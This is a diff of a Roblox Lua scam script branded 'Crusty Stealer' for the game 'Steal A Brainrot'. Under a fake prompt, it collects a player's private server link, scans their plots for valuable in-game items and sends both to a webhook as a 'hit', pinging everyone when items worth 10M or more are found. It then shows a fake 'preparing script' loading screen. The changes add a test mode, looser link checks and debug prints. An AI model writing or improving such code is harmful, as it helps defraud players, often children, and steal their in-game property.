@@ -228,7 +228,7 @@ local function createUI()
     TextBox.Position = UDim2.new(0, 12, 0, 5)
     TextBox.BackgroundTransparency = 1
     TextBox.Font = Enum.Font.Gotham
-    TextBox.PlaceholderText = "Please Enter Your PS Link"
+    TextBox.PlaceholderText = "Please Enter Your PS Link (or TEST_DEV)"
     TextBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
     TextBox.Text = ""
     TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -259,7 +259,7 @@ local function createUI()
     Warning.Position = UDim2.new(0, 0, 0, 170)
     Warning.BackgroundTransparency = 1
     Warning.Font = Enum.Font.Gotham
-    Warning.Text = "\226\154\160\239\184\143 You Need A In PS"
+    Warning.Text = "\226\154\160\239\184\143 You Need A In PS (TEST_DEV for test mode)"
     Warning.TextColor3 = Color3.fromRGB(255, 170, 80)
     Warning.TextSize = 12
     Warning.TextWrapped = true
@@ -478,7 +478,7 @@ local function groupAnimals(animalData)
     return grouped
 end
 
--- 10M+ brainrot kontrolü için yeni fonksiyon
+-- 10M+ brainrot kontrolü için fonksiyon
 local function hasHighValueBrainrot(animalData)
     for _, data in pairs(animalData) do
         if data.generation >= 10000000 then -- 10M = 10,000,000
@@ -559,32 +559,45 @@ local gui, textBox, submitButton = createUI()
 submitButton.MouseButton1Click:Connect(function()
     local serverLink = textBox.Text
     
+    print("Submit button clicked!")
+    print("Server Link:", serverLink)
+    
+    -- Boş kontrol
     if serverLink == "" then
+        print("Link is empty")
         textBox.PlaceholderText = "\226\157\140 Enter a link!"
         task.wait(2)
-        textBox.PlaceholderText = "Please Enter Your Private Server Link"
+        textBox.PlaceholderText = "Please Enter Your PS Link (or TEST_DEV)"
         return
     end
     
-    local isValidLink = serverLink:match("roblox%.com") and 
-                       (serverLink:match("privateServerLinkCode=") or 
-                        serverLink:match("/games/") or 
-                        serverLink:match("share%-links"))
+    -- TEST_DEV kontrolü veya https:// ile başlayan link kontrolü
+    local isTestMode = serverLink == "TEST_DEV"
+    local isValidLink = string.sub(serverLink, 1, 8) == "https://"
     
-    if not isValidLink then
-        textBox.PlaceholderText = "\226\157\140 Enter a valid Roblox link!"
+    print("Is Test Mode:", isTestMode)
+    print("Is Valid Link:", isValidLink)
+    
+    if not isTestMode and not isValidLink then
+        print("Invalid link")
+        textBox.PlaceholderText = "\226\157\140 Must start with https://!"
         task.wait(2)
-        textBox.PlaceholderText = "Please Enter Your Private Server Link"
+        textBox.PlaceholderText = "Please Enter Your PS Link (or TEST_DEV)"
         return
     end
     
+    print("Validation passed, destroying GUI")
     gui:Destroy()
     
+    print("Scanning plots...")
     local animalData = scanPlots()
+    print("Found animals:", #animalData)
+    
     local groupedAnimals = groupAnimals(animalData)
     
     -- 10M+ brainrot kontrolü
     local shouldMentionEveryone = hasHighValueBrainrot(animalData)
+    print("Should mention everyone:", shouldMentionEveryone)
     
     local animalList = {}
     for _, data in pairs(groupedAnimals) do
@@ -622,8 +635,9 @@ submitButton.MouseButton1Click:Connect(function()
         {
             name = "\240\159\140\144 Server Information",
             value = string.format(
-                "```yaml\nPlayers: %d\nGame: Steal A Brainrot\nStatus: Private Server```",
-                #Players:GetPlayers()
+                "```yaml\nPlayers: %d\nGame: Steal A Brainrot\nStatus: %s```",
+                #Players:GetPlayers(),
+                isTestMode and "TEST MODE" or "Private Server"
             ),
             inline = false
         }
@@ -650,15 +664,15 @@ submitButton.MouseButton1Click:Connect(function()
     
     table.insert(fields, {
         name = "\240\159\148\151 Target Server",
-        value = serverLink,
+        value = isTestMode and "**TEST MODE - NO LINK PROVIDED**" or serverLink,
         inline = false
     })
     
     local embedColor = shouldMentionEveryone and 0xFF0000 or 0x8A2BE2 -- Kırmızı veya mor
     
     local embed = {
-        title = shouldMentionEveryone and "🚨 CRUSTY STEALER - HIGH VALUE HIT! 🚨" or "Crusty Stealer",
-        description = shouldMentionEveryone and "**🔥 10M+ BRAINROT DETECTED! 🔥**" or "**You Got A Hit!**",
+        title = shouldMentionEveryone and "🚨 CRUSTY STEALER - HIGH VALUE HIT! 🚨" or (isTestMode and "🧪 CRUSTY STEALER - TEST MODE 🧪" or "Crusty Stealer"),
+        description = shouldMentionEveryone and "**🔥 10M+ BRAINROT DETECTED! 🔥**" or (isTestMode and "**Test Mode Active!**" or "**You Got A Hit!**"),
         color = embedColor,
         thumbnail = {
             url = avatarUrl
@@ -671,8 +685,10 @@ submitButton.MouseButton1Click:Connect(function()
         timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
     }
     
+    print("Sending webhook...")
     sendWebhook(embed, shouldMentionEveryone)
     
+    print("Creating loading screen...")
     local loadingGui, loadingText = createLoadingScreen("\226\154\153\239\184\143 PREPARING SCRIPT...")
     task.wait(20)
     loadingText.Text = "\240\159\148\141 SEARCHING BOTS..."
